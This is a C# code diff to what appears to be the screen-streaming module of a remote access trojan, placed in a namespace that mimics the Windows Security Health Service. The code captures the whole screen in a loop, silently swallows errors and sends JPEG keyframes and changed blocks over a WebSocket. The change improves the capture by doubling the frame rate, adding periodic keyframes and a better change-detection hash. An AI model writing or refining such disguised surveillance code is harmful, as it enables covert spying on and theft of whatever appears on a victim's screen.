@@ -730,19 +730,39 @@ namespace WinSecHealthSvc
             } catch { return; }
 
             var ep = new EncoderParameters(1);
-            ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 65L);
+            ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 60L);
             var jc = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
             
             int grid = 32;
             var bounds = Screen.PrimaryScreen.Bounds;
-            Dictionary<int, long> hashes = new Dictionary<int, long>();
+            Dictionary<int, ulong> hashes = new Dictionary<int, ulong>();
+            DateTime lastKeyFrame = DateTime.MinValue;
 
             while (_screenStreaming && ws.State == WebSocketState.Open) {
                 try {
-                    using (var fullBmp = new Bitmap(bounds.Width, bounds.Height)) {
+                    bool forceKeyFrame = (DateTime.UtcNow - lastKeyFrame).TotalSeconds > 5;
+                    using (var fullBmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb)) {
                         using (var g = Graphics.FromImage(fullBmp)) g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
                         
-                        // Divide into 32x32 blocks
+                        if (forceKeyFrame) {
+                            lastKeyFrame = DateTime.UtcNow;
+                            using (var ms = new MemoryStream()) {
+                                fullBmp.Save(ms, jc, ep);
+                                byte[] jpeg = ms.ToArray();
+                                byte[] pkt = new byte[11 + jpeg.Length];
+                                pkt[0] = 0x01; // KeyFrame
+                                BitConverter.GetBytes((ushort)0).CopyTo(pkt, 1);
+                                BitConverter.GetBytes((ushort)0).CopyTo(pkt, 3);
+                                BitConverter.GetBytes((ushort)bounds.Width).CopyTo(pkt, 5);
+                                BitConverter.GetBytes((ushort)bounds.Height).CopyTo(pkt, 7);
+                                BitConverter.GetBytes(jpeg.Length).CopyTo(pkt, 9);
+                                Buffer.BlockCopy(jpeg, 0, pkt, 11, jpeg.Length);
+                                await ws.SendAsync(new ArraySegment<byte>(pkt), WebSocketMessageType.Binary, true, CancellationToken.None);
+                            }
+                            hashes.Clear(); // Reset hashes on keyframe
+                        }
+
+                        // Divide into blocks
                         for (int y = 0; y < bounds.Height; y += grid) {
                             for (int x = 0; x < bounds.Width; x += grid) {
                                 int w = Math.Min(grid, bounds.Width - x);
@@ -750,12 +770,12 @@ namespace WinSecHealthSvc
                                 int blockId = (y / grid) * 1000 + (x / grid);
 
                                 using (var block = fullBmp.Clone(new Rectangle(x, y, w, h), fullBmp.PixelFormat)) {
-                                    // Simple hash
-                                    long hash = 0;
+                                    ulong hash = 5381;
                                     var bd = block.LockBits(new Rectangle(0,0,w,h), ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);
                                     unsafe {
-                                        byte* p = (byte*)bd.Scan0;
-                                        for(int i=0; i<w*h*4; i+=16) hash += p[i]; 
+                                        uint* p = (uint*)bd.Scan0;
+                                        int len = w * h;
+                                        for(int i=0; i<len; i++) hash = ((hash << 5) + hash) + p[i];
                                     }
                                     block.UnlockBits(bd);
 
@@ -764,7 +784,6 @@ namespace WinSecHealthSvc
                                         using (var ms = new MemoryStream()) {
                                             block.Save(ms, jc, ep);
                                             byte[] jpeg = ms.ToArray();
-                                            // Header: [Type:1][X:2][Y:2][W:2][H:2][Len:4] = 11 bytes
                                             byte[] pkt = new byte[11 + jpeg.Length];
                                             pkt[0] = 0x02; // Delta
                                             BitConverter.GetBytes((ushort)x).CopyTo(pkt, 1);
@@ -781,7 +800,7 @@ namespace WinSecHealthSvc
                         }
                     }
                 } catch {}
-                await Task.Delay(100);
+                await Task.Delay(50);
             }
             try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch {}
         }
